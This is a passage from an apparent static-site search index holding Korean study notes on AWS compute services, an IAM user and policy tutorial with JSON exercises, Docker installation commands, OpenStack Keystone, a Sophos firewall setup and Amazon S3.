적합한 하드웨어/ 소프트웨어 프로파일을 선택 방법을 이해한다.\n  EC2 요금 모델과 필요에 맞는 요금 선택 방법을 이해한다.\n  배포 프로파일에 맞게 보안과 액세스의 균형을 조절해서 보안 그룹을 구성하는 방법을 이해한다.\n  실행 중인 인스턴스에 액세스하는 방법을 이해한다.\n  스토리지 볼륨 유형의 기능과 작동을 이해한다.\n  스토리지 볼륨에서 스냅샷 생성 방법과 다른 인스턴스에 스냅샷을 연결하는 방법을 파악한다.\n    "});index.add({'id':35,'href':'/docs/cloudcomputing/amazonwebservice/aws_computing/','title':"AWS Computing",'content':"AWS 컴퓨팅 서비스   EC2 ( Elastic Compute Cloud )   EC2 공식 홈페이지 가상 컴퓨팅 서비스를 제공해주는 서버로 실제 물리서버와 똑같은 형태의 서비스를 제공 AMI를 통해 필요한 운영체제와 여러 소프트웨어를 쉽게 생성 가능 키 페어를 사용하여 로그린 정보 보호 SSH로 원격 연결이 가능 중지가 가능한 EBS 기반 인스턴스와 임시 스토리지를 제공하여 중지가 불가능한 Instance Store 기반 EC2로 분류 됨 ( 재부팅은 모두 가능 ) 인스턴스의 유형으로는 범용, 컴퓨팅 최적화, 메모리 최적화, 스토리지 최적화 등이 존재   EC2 상태의 종류  Pending : 인스턴스가 구동하기 위해 준비중인 상태, 요금 미청구 Runnung : 인스턴스가 실행하고 사용할 준비가 된 상태, 요금 청구 Stopping : 인스턴스가 중지 모드로 전환되려는 상태, 요금 미청구 Shutting-down : 인스턴스가 종료를 위해 준비중인 상태, 요금 미청구 Terminated : 인스턴스가 종료된 상태, 요금 미청구   EC2 구매옵션  On demand : 필요할 때 바로 생성하는 방식으로 1시간 단위로 과금이 이루어짐 ( 1분 사용시도 1시간 ) Spot : 경매방식의 인스턴스 기준가격보다 높은 가격 제시시 사용가능하며, 타인에 의해 불시로 종료되거나 정지될 수 있어 각종 테스트에 적합 Reserved : 12개월- 36개월 단위로 예약하여 사용하는 인스턴스로 On demandq비해 가격이 대폭 할인되며, 장기적으로 사용할 경우 효율이 좋지만, 예약된 인스턴스이기에 사용하지 않아도 과금이 부과되어짐    Lightsail   Lightsail Site AWS에서 VPS ( Virtual Private Server : 가상 사설 서버 ) 를 시작하는 가장 쉽고 빠른 방법 가상 사설 서버, 영구적인 스토리지, 네트워킹을 포함 클릭 한 번으로 모든 과정을 생략, 쉽게 VPS를 생성 및 관리 확장가능 및 타 AWS Services에 접근 가능 고가용성 어플리케이션 생성 가능 저렴하고, 비용의 예측이 보다 쉬움 완전히 사전구성되어 있는 서버 ( BluePrint )   Lightsail의 유료 Plan  월간 무료 데이터 허용량 초과시, 퍼블릭 IP 주소를 사용ㅎ여 요금 청구 Lightsail 스냅샷 비용 : 인스턴스 스냅샷 + 디스크 스냅샷 1시간 이상 인스턴스에 연결되어 있지 않은 고정 IP ( Elastic IP ) 무료로 주어지는 3백만 개의 쿼리를 초과하는 경우   Lightsail\u0026amp; EC2  Lightsail의 주 사용용도  웹 사이트 및 블로그 단순 앱 개발 및 테스트 환경 소수의 서버로 구성된 비즈니스 소프트웨어   EC2  빅데이터 분석 고성능 컴퓨팅 과학 분야 컴퓨팅 멀티'티어 애플리케이션      ECS ( Elastic Container Service )   AWS의 Virtual Machine, VM (가상 머신) 가상의 컴퓨터, 하나의 호스트에 안에 또다른 호스트를 만들어 사용하는 것 CPU, Memory와 같은 주요 하드웨어 부품을 소프트웨어로 완전 재현해내어 기능을 흉내내게 하고(에뮬레이션), 격리된 실행 환경(OS)를 만듬 즉 하드웨어를 직접 가상화 클러스터에서 도커 컨테이너를 손쉽게 관리하기 위해 컨테이너 관리 서비스 클러스터는 Task(작업) 또는 서비스로 일컬어지는 컨테이너들의 집합    2가지 구성 요소로 시작 가능  EC2(Container Instance) : EC2를 생성하여 EC2 내에 Task(컨테이너가 수행할 작업) Fargate : EC2를 생성하거나 컨테이너를 실행하기 위한 Orchestration을 AWS가 맡아 하는 서비스로, 관리가 용이함   하나의 클러스터 내에 다수의 Task 혹은 컨테이너 인스턴스로 구성됨 또한 ELB, EBS 볼륨, VPC, IAM과 같은 기능을 사용하여 구성 가능 즉 ECS 각 작업의 권한, ECS 액세스를 IAM으로 조절하거나, EC2 유형의 컨테이너 인스턴스만이 OS에 액세스 가능한 특징 등을 갖게 됨 호스트의 OS(Operating System) 내에 또다른 실행환경의 OS가 존재함 윈도우 OS의 호스트 내에 리눅스, 우분투 등의 다양한 OS를 올릴 수 있음 다만 OS를 포함하기 때문에 용량을 많이 차지할 뿐더러, 사용자가 필요치 않는 기능까지 포함할 수 있으며 느림   Linux Container  ECS를 사용하는 목적이자 관리 대상 하드웨어가 아닌 OS를 가상화하여 커널을 공유하며 프로세스(컨테이너와 비슷)를 격리된 환경에서 실행하는 것 VM와 달리 달리 호스트의 OS에서 가상화를 실시하여, 이 OS 위에 프로세스들이 ‘컨테이너’로서 격리된 환경에서 실행됨 호스트의 입장에선 컨테이너는 프로세스에 불과하지만, 컨테이너 입장에서는 독립된 실행환경임 OS를 포함하지 않는만큼 가볍고, 하드웨어를 가상화하지 않기 때문에 빠름   Kernel  Operaintg System에서 가장 중요한 역할을 맡고 있는 핵심(核心) 커널이 각 프로세스(실행환경)에 하드웨어 자원(CPU 등)을 할당하고, 작업 스케쥴링(처리순서)를 담당하며, 프로세스 간 접근과 보안을 책임짐 과거에 커널이 없던 시절에도 컴퓨터는 존재할 수 있었으나 메모리를 초기화하기 위해서는 컴퓨터를 리부팅해야 하는 등, 자원관리/제어 주체의 필요성에 의해 탄생   Docker  앞서 설명한 Linux Container 기술에 근간을 두는 오픈소스 컨테이너 프로젝트 ‘Docker’라는 단어 자체가 ‘부두에서 일하는 노동자’, 즉 컨테이너를 관리하는 존재임을 뜻함 Linux Container 기술을 사용하는 솔루션이므로 별도의 OS를 설치하지 않고 컨테이너를 생성하여 애플리케이션을 실행함 컨테이너를 생성할 이미지(서비스에 필요한 리소스를 모아둔 최소한의 단위)를 기반으로 운영함 이미지만 가지고 있다면 어느 시점에서든 동일한 리소스의 컨테이너를 생성할 수 있음 그 밖에 컨테이너간의 연결, 다양한 API 제공 등의 기능을 보유    Lambda   Serverless Service 서버를 구축, 프로비져닝하고 필요한 패키지를 설치하는 등의 과정을 거치지 않고, 코드를 실행하는 서비스 사용자는 애플리케이션이나 백엔드 서비스를 관리할 필요 없이 코드를 실행할 수 있음 CloudWatch, ALB, DynamoDB 등을 트리거로 이용하여 특정 상황에서 코드를 실행시키고 것이 가능 API Gateway와 Lambda를 조합하여 요청별로 특정 코드를 수행하도록 구성 가능 15분을 초과하는 작업에 대해서는 Lambda 비적합   Lamda Function의 정의와 구성  코드를 실행하기 위해 호출할 수 있는 리소스 이벤트를 처리하는 코드, 계층, 트리거, 전달 대상 등으로 구성됨  함수코드 : 실제 호출되기 실행되는 코드, Runtime(코드 실행지원), IAM, VPC, Memory 등으로 구성됨 트리거 : 함수코드를 발동시키는 서비스(S3, SNS, SQS, DynamoDB, CloudWatch Event, Cloudwatch Log 등)   SNS의 메시지 구독 대상에 Lambda를 포함시키면, 메시지 발송시 Lambda가 이를 전달받고 함수코드 실행  전달대상 : 함수가 비동기식으로 호출되거나, 레코드를 처리한 경우 전달될 대상   SNS, SQS, 또다른 Lambda, EventBridge 이벤트 버스로 전달가능 NS로부터 메시지를 전달받아 코드를 처리하고 이를 SQS로 보내 메시지 대기열에 적재할 수 있음   EC2 vs Lambda  EC2 사용시 프로비져닝, 운영 체제, 네트워크 세부 설정, 보안 설정 등을 사용자가 원하는 방향으로 지정 가능 Lambda 사용시 프로비져닝 필요없이 AWS가 모니터링, 프로비져닝, 보안패치 적용, 코드 배포를 모두 수행함    Batch   종합 관리형 서비스 한 리전 내의 여러 가용 영역에 걸쳐 배치 작업을 실행하는 과정을 간소화하는 리전 서비스 새 VPC 또는 기존 VPC에서 컴퓨팅 환경을 생성할 수 있음 AWS Batch를 사용하면 AWS 클라우드에서 배치 컴퓨팅 워크로드를 실행이 가능  배치 컴퓨팅 : 다수의 사람들이 수 많은 컴퓨터 리소스에 엑세스 할 때 일반적으로 사용하는 방법     AWS Batch의 구성요소  작업  AWS Batch에 제출한 작업 단위 ( 쉘 스크립ㅌ, Linux 실행 파일, Docker 컨테이너 이미지 ) 작업에는 이름이 있으며, 파라미터를 사용하여 컴퓨팅 환경의 인스턴스에서 컨테이너화된 애플리케이션으로 실행   작업 정의  작업이 실행되는 방식을 지정하며 작업에 있는 리소스에 대한 블루프린트를 의미 IAM 역할을 제공하여 다른 AWS 리소스에 프로그래밍 방식으로 엑세스할 수 있으며 메모리 및 CPU 요구 사항을 모두 지정가능   작업 대기열  AWS Batch 작업이 대기열 예약되는 환경 우선 순위 갑 및 작업 대기열 전체에 우선 순위 할당 가능   컴퓨팅 환경  작업을 싱해하는 데 사용되는 관리형 또는 비관리형 컴퓨팅 리소스 세트 여러 세부 수준에서의 인스턴스 유형의 설정이 가능     Batch Group  클러스터 : 인스턴스를 AZ 내에서 근접하게 배치, 결합된 노드 간 낮은 지연 시간의 네트워크 달성 가능 파티션 : 인스턴스가 담긴 그룹을 논리 세그먼트로 나누어 각 파티션에 배치, 최대 7개의 파티션을 가질 수 있으며, 각 파티션은 자체 랙 세트를 보유하고 자체 네트워크 전원을 보유 분산 : 파티션이 논리 세그먼트로 분리된 인스턴스 그룹인 것과 달리 분산은 인스턴스 개체 하나가 자체 랙에 분산 배치됨, AZ당 최대 7개의 인스턴스 배치 가능    Elastic Beanstalk   Java, NET, PHP, Node js, Python, Ruby, Go, Docker을 사용하여 Apache, Nginx, Passenger, llS와 같은 친숙한 서버에서 개발된 웹 어플리케이션 및 서비스를 간편하게 배포하고 조정 할 수 있는 서비스 EC2, ASG, RDS 등 AWS 리소스들을 조합하여 완성된 어플리케이션 플랫폼으로 PaaS의 일종 오토 스케일링, 로브 밸런싱, 버전 관리 등의 기능을 콘솔에서 몇 번의 클릭으로 생성 가능 실제 서비스가 아니기에 사용 요금이 없음   Elastic Beanstalk의 장점  간단한 서버 세팅 환경변수들을 쉽게 변경/ 관리가 가능 오토 스케일링이 용이 로그의 자동화 추가요금이 없음 #  "});index.add({'id':36,'href':'/docs/cloudcomputing/awstraining/','title':"AWS Training",'content':"Amazon Web Service Training AWS 시작하기 AWS 사용자 계정 생성 AWS CLI 활용 AWS 사용자 정의 VPC 생성 AWS EC2 생성 AWS AMI 생성 AWS Elastic IP 할당 AWS ELB ( 2 Tier ) 생성 AWS AutoScaling AWS RDS 생성 AWS 3Tier 구현 AWS S3 생성      "});index.add({'id':37,'href':'/docs/cloudcomputing/awstraining/iam/','title':"AWS 사용자 계정 생성",'content':"AWS 사용자 계정 생성    AWS 사용자 계정 생성    이번 시간에는 AWS 계정생성에 이어 AWS 사용자 계정을 생성해보도록 하겠습니다. IAM이 무엇인지는 AWS IAM을 참고해주세요.      먼저 AWS에 로그인 후, IAM 서비스를 검색합니다.      IAM 서비스에 진입하여, 메뉴에서 사용자를 클릭합니다.      사용자 추가를 선택합니다.      사용자의 이름을 기입하고, 엑세스 유형을 선택합니다. AccesskeyId와 SecreKey는 AWS CLI, API, SDK 등 기타 개발 도구의 사용되며, Login url, Password 콘솔창의 로그인시 사용됩니다.       유형 AccessKeyId SecreKey Login url Password     프로그래밍 방식 O O X X   AWS Management Console Access 방식 X X O O         여기서는 프로그래밍 방식 및 AWS Console 방식을 모두 체크하겠습니다. 체크가 완료되면, 편하게 사용할 수 있도록, 직접 암호를 입력합니다.      다음으로 그룹에 사용자를 추가하기 위해 그룹을 생성합니다.      그룹에는 AdminstratorAccess ( 관리자 권한 ) 역할을 추가합니다. 이 역할에 대해서는 끝에서 다시 한번 다루겠습니다.      설정이 완료되면, 다음으로 진행하고, 마지막으로 사용자가 추가됨을 확인할 수 있습니다. 전에 선택한 엑세스 유형에 맞춰 csv 파일의 항목이 다르며, 두 가지를 전부 선택한 저는 엑세스 및 시크릿 키와 url이 전부 포함되어 있습니다. 여기서 다운받는 csv파일은 후에, 같은 값으로는 다운 받을 수 없으니, 삭제되지 않도록 잘 저장해야합니다.      url로 접속 후, 설정한 ID와 비밀번호를 입력하면 해당 User로 접속이 완료됩니다. 이를 통해 특정 유저에게 특정권한만을 주어, 해킹 및 실수 등을 예방 및 관리가 가능합니다.     IAM 정책 커스터마이징    IAM 계정을 생성하며, IAM 정책을 통해 생성그룹에 권한을 부여 했습니다. 그렇다면 IAM 정책을 커스터마이징할 수는 없을까요? 먼저, 정책은 json 파일 형식으로 되어 있으며, 이를 직접 만들기에는 까다로울 수 있지만, 있는 것을 복사한 뒤 수정하는 것은 그렇게 어렵지는 않습니다. ( 또한 최근에는 개념만 충분히 숙지하고 계시면 콘솔 창에서 클릭만으로도 가능합니다\u0026hellip; ) 이번에 이를 확인하여 보겠습니다.      먼저 IAM 서비스의 메뉴에서 정책을 선택합니다. 그 후, User 계정을 생성할 때 사용했던 AdminstratorAccess를 선택합니다.      그 후, 권한에서 { }json을 클릭 후 해당 내용들을 확인합니다.       옵션 Version Statment Effect Action Resource     의미 파일의 버전 파일 정책의 내용 허가 또는 거부 ( Allow or Deny ) 설정 대상 서비스와 대상 조작을 작성 설정 대상 리소스를 작성      즉, 여기에서는 \u0026ldquo;*\u0026rdquo; = 모든 대상 서비스와 대상에 대한 조작은 모두 허가한다는 것입니다. 이 의외에도 특정 IP에 대한 권한만을 주거나 할 수 있으며, 보다 자세한 사항은 IAM 정책 LINK을 참조하시길 바랍니다.      그럼 이번에는 직접 정책을 생성해보도록 하겠습니다. 다시 정책으로 돌아와, 상단의 정책생성을 클릭합니다.      상단을 보면, 시각적 편집기와 JSON 파일 형식을 확인할 수 있습니다. 여기서는 동일하게 S3에 대한 모든 권한을 가질 수 있는 정책을 생성해보도록 하겠습니다.      다음으로는 이름과 설명을 기입 후, 정책을 생성합니다.      정책이 생성되면, 정책 필터를 통해 확인이 가능합니다.      생성된 정책에 진입하면, 작성했던 Json파일의 내용을 확인할 수 있습니다.      다음으로는 다시 정책생성으로 돌아와 콘솔창을 통해 생성해 보도록 하겠습니다.   서비스 : S3\n작업 : 모든 S3 작업\n리소스 : 모든 리소스\n요청 조건 : 선택 안함\n     다시 이름과 설명을 기입 후, 정책을 생성합니다.      정책 필터를 통해 S3-User로 진입합니다.      Json형식으로 확인해보면, Sid를 제외한 값이 모두 동일함을 확인할 수 있습니다. 이를 통해, 콘솔이나 json파일을 통해 동일한 값으로 생성할 수 있음을 알 수 있었습니다. 이에 대한 확인을 IAM을 통해 새로운 계정을 생성 후, 생성한 권한을 주어, S3에 진입 후, bucket을 생성하거나, 혹은 생성해 둔 bucket을 통해 알 수 있습니다. ( S3 권한만을 주었기 때문에, 다른 서비스에 대한 이용은 불가능합니다. )     예제   예제 1. 관리자의 권한을 가졌지지만, 엑세스 ID와 비밀 엑세스 키만 가지고 있는 사용자를 만들어보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다. \r\r\r\r    예제 2. 모든 EC2에 대한 읽기권한만을 가지고, 현재 IP만이 사용가능한 정책을 생성하세요.  \r예제 2. 답안\r↕\r\r 편집기 사용시   서비스 : EC2\n작업 : 읽기\n리소스 : 모든 리소스 요청조건 : 소스 IP ( 자신의 IP )\n   Json 사용시  {\r\u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;,\r\u0026#34;Statement\u0026#34;: [\r{\r\u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;,\r\u0026#34;Action\u0026#34;: [\r\u0026#34;ec2:GetDefaultCreditSpecification\u0026#34;,\r\u0026#34;ec2:DescribeTags\u0026#34;,\r\u0026#34;ec2:GetCoipPoolUsage\u0026#34;,\r\u0026#34;ec2:DescribeVpnConnections\u0026#34;,\r\u0026#34;ec2:GetEbsEncryptionByDefault\u0026#34;,\r\u0026#34;ec2:GetCapacityReservationUsage\u0026#34;,\r\u0026#34;ec2:DescribeVolumesModifications\u0026#34;,\r\u0026#34;ec2:GetHostReservationPurchasePreview\u0026#34;,\r\u0026#34;ec2:DescribeFastSnapshotRestores\u0026#34;,\r\u0026#34;ec2:GetConsoleScreenshot\u0026#34;,\r\u0026#34;ec2:GetReservedInstancesExchangeQuote\u0026#34;,\r\u0026#34;ec2:GetConsoleOutput\u0026#34;,\r\u0026#34;ec2:GetPasswordData\u0026#34;,\r\u0026#34;ec2:GetLaunchTemplateData\u0026#34;,\r\u0026#34;ec2:DescribeScheduledInstances\u0026#34;,\r\u0026#34;ec2:DescribeScheduledInstanceAvailability\u0026#34;,\r\u0026#34;ec2:GetEbsDefaultKmsKeyId\u0026#34;,\r\u0026#34;ec2:DescribeElasticGpus\u0026#34;\r],\r\u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;,\r\u0026#34;Condition\u0026#34;: {\r\u0026#34;IpAddress\u0026#34;: {\r\u0026#34;aws:SourceIp\u0026#34;: \u0026#34;자신의 IP\u0026#34;\r}\r}\r}\r]\r}\r\r\r\r\r    예제 3. 예제 2에서 생성한 정책을 편집하여 RDS에 대한 모든 권한을 주는 정책을 생성하고, EC2에서의 IP제한에 대한 설정을 제거해보세요..  \r예제 3. 답안\r↕\r\r 예제 2에서 생성한 정책에 진입하여, 기존 정책을 편집   편집기 사용시   요청조건 : 소스 IP의 항목을 체크 제거\n   Json 사용시  {\r\u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;,\r\u0026#34;Statement\u0026#34;: [\r{\r\u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;,\r\u0026#34;Action\u0026#34;: [\r\u0026#34;ec2:GetDefaultCreditSpecification\u0026#34;,\r\u0026#34;ec2:DescribeTags\u0026#34;,\r\u0026#34;ec2:GetCoipPoolUsage\u0026#34;,\r\u0026#34;ec2:DescribeVpnConnections\u0026#34;,\r\u0026#34;ec2:GetEbsEncryptionByDefault\u0026#34;,\r\u0026#34;ec2:GetCapacityReservationUsage\u0026#34;,\r\u0026#34;ec2:DescribeVolumesModifications\u0026#34;,\r\u0026#34;ec2:GetHostReservationPurchasePreview\u0026#34;,\r\u0026#34;ec2:DescribeFastSnapshotRestores\u0026#34;,\r\u0026#34;ec2:GetConsoleScreenshot\u0026#34;,\r\u0026#34;ec2:GetReservedInstancesExchangeQuote\u0026#34;,\r\u0026#34;ec2:GetConsoleOutput\u0026#34;,\r\u0026#34;ec2:GetPasswordData\u0026#34;,\r\u0026#34;ec2:GetLaunchTemplateData\u0026#34;,\r\u0026#34;ec2:DescribeScheduledInstances\u0026#34;,\r\u0026#34;ec2:DescribeScheduledInstanceAvailability\u0026#34;,\r\u0026#34;ec2:GetEbsDefaultKmsKeyId\u0026#34;,\r\u0026#34;ec2:DescribeElasticGpus\u0026#34;\r],\r\u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;,\r}\r]\r}\r 예제 2에서 생성한 정책에 진입하여, 정책 편집을 클릭 후, 권한 추가   편집기 사용시   서비스 : RDS\n작업 : 모든 RDS에 대한 작업\n리소스 : 모든 리소스 요청조건 : 없음\n   Json 사용시  {\r\u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;,\r\u0026#34;Statement\u0026#34;: [\r{\r\u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;,\r\u0026#34;Action\u0026#34;: [\r\u0026#34;RDS:*\u0026#34;,\r\u0026#34;ec2:GetDefaultCreditSpecification\u0026#34;,\r\u0026#34;ec2:DescribeTags\u0026#34;,\r\u0026#34;ec2:GetCoipPoolUsage\u0026#34;,\r\u0026#34;ec2:DescribeVpnConnections\u0026#34;,\r\u0026#34;ec2:GetEbsEncryptionByDefault\u0026#34;,\r\u0026#34;ec2:GetCapacityReservationUsage\u0026#34;,\r\u0026#34;ec2:DescribeVolumesModifications\u0026#34;,\r\u0026#34;ec2:GetHostReservationPurchasePreview\u0026#34;,\r\u0026#34;ec2:DescribeFastSnapshotRestores\u0026#34;,\r\u0026#34;ec2:GetConsoleScreenshot\u0026#34;,\r\u0026#34;ec2:GetReservedInstancesExchangeQuote\u0026#34;,\r\u0026#34;ec2:GetConsoleOutput\u0026#34;,\r\u0026#34;ec2:GetPasswordData\u0026#34;,\r\u0026#34;ec2:GetLaunchTemplateData\u0026#34;,\r\u0026#34;ec2:DescribeScheduledInstances\u0026#34;,\r\u0026#34;ec2:DescribeScheduledInstanceAvailability\u0026#34;,\r\u0026#34;ec2:GetEbsDefaultKmsKeyId\u0026#34;,\r\u0026#34;ec2:DescribeElasticGpus\u0026#34;\r],\r\u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;,\r}\r]\r}\r\r\r\r\r "});index.add({'id':38,'href':'/docs/cloudcomputing/docker/docker-2/','title':"Docker 환경구축",'content':"Docker 환경구축    이번 장에서는 로컬환경에서 Docker를 구축하는 방법에 대해 알아보겠습니다.    Docker 설치     Ubuntu 18.04   $ sudo apt update -y\r$ sudo apt install –y apt-transport-https\r$ sudo apt install -y ca-certificates curl software-properties-common\r# 의존성 패키지 설치\r$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\r$ sudo add-apt-repository \u0026#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\u0026#34;\r# 도커 패키지 저장소 등록\r$ sudo apt update -y\r$ sudo apt install -y docker-ce\r# 도커 설치\r$ docker version\r   CentOS 7   $ sudo yum update -y\r$ sudo yum install –y docker docker-registry epel-release jq\r# 도커 설치 및 도커 레지스트리 설치\r$ systemctl enable docker\r$ systemctl start docker\r$ systemctl status docker\r# 도커 자동시작 설정 및 확인\r$ sudo yum remove docker \\\rdocker-client \\\rdocker-client-latest \\\rdocker-common \\\rdocker-latest \\\rdocker-latest-logrotate \\\rdocker-engine\r# 도커 구버전 제거\r   "});index.add({'id':39,'href':'/docs/cloudcomputing/openstack/keystone/','title':"Keystone",'content':"인증을 관리하는 서비스 : Keyston   인증을 관리하는 서비스 : Keystone   Keystone은 인증 토큰을 비롯해 테넌트 및 사용자 관리, 서비스의 엔드포인트 URL 등을 관리하는 서비스 Keystone은 openstack의 백엔드에서 RBAD ( Role Based Access Control )을 통해 사용자의 접근을 제어하는 등의 인증 ( Identify ) 서비스로 사용되며 다음과 같은 기능으로 이루어져 있음     Keystone의 구성요소      구성요소 역할     user 사람 또는 오픈 스택 서비스를 이용하는 서비스 ( nova, neutron, cinder 등 )을 의미     User은 특정 프로젝트에 할당할 수 있으며, 증복을 허용하지 않음         Authentication 사용자의 신분을 확인하는 절차로, 특정 값을 통해 Keystone이 이를 검증     보통 인증을 위한 자료로는 ID, PW가 사용되며 Keystone은 인증확인 시 인증토큰을 방행         Token RBAD의 신분을 증명하기 위해 사용되는 텍스트 데이터   Token type fernet, uuid, pki, pkiz     어떤 자원에 접근이 가능한지 범위가 지정되어 있음 ( 시간 제한 있음 )         Project Keystone V2까지 Tenant라는 이름으로 사용 ( V3 이후 Project )     어떤 자원이나 어플리케이션에 대한 권리를 가진 보안그룹     프로젝트는 특정 도메인에 의해 소유         Endpoint 사용자가 서비스를 이용하기 위해 연결정보를 제공하는 접근 가능한 네트워크 주소 ( URL )   EndPoint type admin, internal, public         Role 사용자가 어떤 동작을 수행하도록 허용하는 규칙     사용자가 가지는 역할은 사용자에게 발행된 토큰을 통해 확인     사용자가 서비스를 호출하면, 서비스는 토큰에 저장된 사용자의 역할을 해석하여 허용유무 결정         Domain 구성요소를 효과적으로 관리하기 위한 사용자, 그룹, 프로젝트의 집합     사용자들은 한 도메인의 관리자의 권한 등을 부여받는 방식으로 역할을 부여가능     Domain, Project, Group, User, Rule 개념과 관계  Keystone은 위에도 언급하였 듯이 사용자 인증 부분과 서비스 인증 부분을 관리 사용자일 때는 사용자 ID와 패스워드, 사용자 권한의 롤( Roll )을 등록 서비스일 때는 서비스를 등록하고 해당 서비스의 엔드포인트 URL을 등록  도메인(Domain)은 서로 분리되어 있음 각 도메인에는 프로젝트와 사용자가 있음 프로젝트는 사용자를 가질 수 있음 사용자에게는 롤이 있으며, 여러 프로젝트의 구성원이 될 수 있음 관리자 롤(Admin Role)을 가진 사용자끼리, 일반 사용자롤(Member Role)을 가진 사용자간의 그룹핑(Grouping)을 할 수 있음       Keystone의 논리 아키텍처   Keystone의 논리 아키텍처는 토큰(Token), 카탈로그(Catalog), 정책(Poliy), 인증(Identity) 으로 구성      구성요소 역할     Token Backend 사용자별 토큰을 관리   Catalog Backend 오픈스택에서 모든 서비스의 엔드포인트 URL을 관리   Policy Backend 테넌트, 사용자 계정, 롤 등을 관리   Identity Backend 사용자 인증을 관리       Openstack에서 Keystone 위치    Openstack Keystone은 모든 서비스를 관장하는 위치 모든 User, Service는 Keystone의 인증을 통해서만 요청, 응답이 가능 Keystone은 타인이나 해커에게서 시스템을 안전하게 보호하고 사용자 등록, 삭제, 권한 관리, 사용자가 접근할 수 있는 서비스 포인트 관리와 다른 API들의 인증 등의 전체적인 인증 프로세스를 관리하는 역할을 수행    "});index.add({'id':40,'href':'/docs/network/mail/','title':"Mail",'content':"a\n"});index.add({'id':41,'href':'/docs/network/sophos/sophos_2/','title':"Sophos 방화벽 구축",'content':"Sophos 방화벽 구축    구성환경    저번 장에 이어 이번에는 10.10.10.0/24 서버를 한 개 추가하여 방화벽을 구축해보도록 하겠습니다. 먼저, 위의 그림과 같이 환경을 세팅합니다. ( Sophos에 대역 추가 )     Network Interfaces 추가    방화벽을 구성하기 전에 먼저, Network Interfaces를 설정하겠습니다.    Sophos에 로그인을 완료하면, 대역이 추가됬음을 확인할 수 있습니다. 하지만 아직 인식만 될 뿐, 되지 않아 추가 설정이 필요합니다.      먼저 좌측 메뉴에서 Interfaces \u0026amp; Routing \u0026gt; Interfaces 를 클릭합니다. 그 후, 인터페이스들이 나열되면 New Interface를 클릭하여 Interface를 추가 및 설성즐 완료합니다. 여기서는 10.10.10.0/24 대역에 10.10.10.3 IP를 가지게 세팅하였습니다.      설정이 완료되면 추가한 인터페이스를 Enable 시켜주시면 정상적으로 Server에서 Sophos로 ping이 통하는 것을 확인할 수 있습니다.                                                                     "});index.add({'id':42,'href':'/docs/programing/shell/shell-3/','title':"Shell 3",'content':"****    ****         #\n"});index.add({'id':43,'href':'/docs/cloudcomputing/awssaa/saa-3/','title':"3장 S3와 Glacier",'content':"3장 Amazon Simple Storage Service와 Amazon Glacier Storage Service   2장의 목표   복원력을 갖춘 아키텍처 설계\n 안정적이고/ 복원력을 갖춘 스로티리지를 선택한다. 어떻게 멀티 티어 아키텍처 솔루션을 설계할지 결정한다. 어떻게 고가용성 및 내결함성을 갖춘 아키텍처를 설계할지 결정한다.    성능이 뛰어난 아키텍처 정의\n 성능이 뛰어난 스토리지 및 데이터베이스를 선택한다. 탄력성과 확장성을 갖춘 솔루션을 설계한다.    안전한 애플리케이션 및 아키텍처 설명\n 어떻게 애플리케이션 티어를 보호할지 결정한다. 어떻게 데이터를 보호할지 결정한다.    비용에 최적화된 아키텍처 설게\n 어떻게 비용에 최적화된 스토리지를 설계할지 결정한다.       Amazon simple Storage Service ( 이하 S3 )    S3는 개인 애플리케이션, 다수 AWS 서비스의 데이터를 보관하며,다음 워크로드를 위한 훌륭한 플랫폼이다.\n  S3의 주요기능\n 백업 아카이브 로그 파일, 재해 복구 이미지 유지 관리 분석을 위한 데이터 저장 정적 웹 사이트 호스팅       S3는 객체 스토리지로, 전 장에서 배운 EC2는 인스턴스를 구동하는 반면 S3는 무제한 객체 스토리지 공간을 효과적으로 제공한다.\n  객체 스토리지와 블록 스토리지의 차이점\n     Type 차이점 예시     블록 스토리지 물리적 디스크를 개별 블록으로 나눠 데이터를 저장하고 파일 시스템으로 관리 Window NTFS, Linux Btrfs, ext 등   객체 스토리지 구조화되지 않은 평면의 저장소에 데이터를 저장하여 무제한의 스토리지를 구현가능 S3, swift 등     S3에 파일을 쓸 때는 2KB 메타 데이터가 함께 저장되며, 이 메타 데이터는 세부 정보를 구성하는 키로 만들어지며, 데이터 사용 권한과 파일 시스템처럼 보여지는 중첩 버킷 내 위치 정보 등이 저장된다.     S3 서비스 아키텍처    S3 파일은 버킷으로 구성되며, AWS 계정당 기본으로 만들 수 있는 버킷은 100개이다.\n  버킷 또한 할당량에 초과사용을 요청할 수 있다.\n  S3 버킷은과 내용은 한 AWS 리전에만 존재하며, 버킷의 주소는 S3 글로벌 시스템 내에서 유일해야한다. ( 증복이 허용되지 않음 )\n  이는 버킷에 보다 쉽게 접속하기 위해 규칙을 정해놓은 것이다.\n  $ https://[ bucketname ].s3.[ region code ].amazon.com/[ filepath ]\r# 엑세스를 위한 URL\r$ s3://[ bucketname ]/[ filepath ]\r# CLI 환경에서의 엑세스\r  이론적으로 버킷에는 무한정의 대이터를 저장할 수 있지만, 단일 객체의 크기는 5TB를 넘을 수 없고, 한 번에 용량에 업로드할 수 있는 용량 크기는 최대 5GB이다.\n  100MB보다 큰 객체를 업로드시에는 멀티 파트 업로드를 사용해서 데이터의 손실 및 업로드가 중지되는 위험을 줄일 수 있다.\n 멀티 파워 업로드 : 데이터를 나눠서 업로드 하는 방식 ( ex : 분할 압축 )    단, 상위 수준의 API에서는 멀티 파트 업로드가 자동이지만, 하위 수준에서는 수동으로 나눠야 한다.\n     암호화    웹 사이트와 같이 퍼블릭에서 엑세스하는 용도가 아니라면, S3에 저장할 데이터는 항상 암호화해야 한다.\n  S3에 저장 중인 데이터를 보호하기 위해서 암호화 키를 사용할 수도 있고, S3에서 다른 위치로 전송하는 데이터를 보호하기 위해서 Amazon 암호화 API 엔드포인트 만을 사용할 수 있다.\n  저장 중 데이터는 서버 측 암호화 혹은 클라이언트 측 암호화를 사용해서 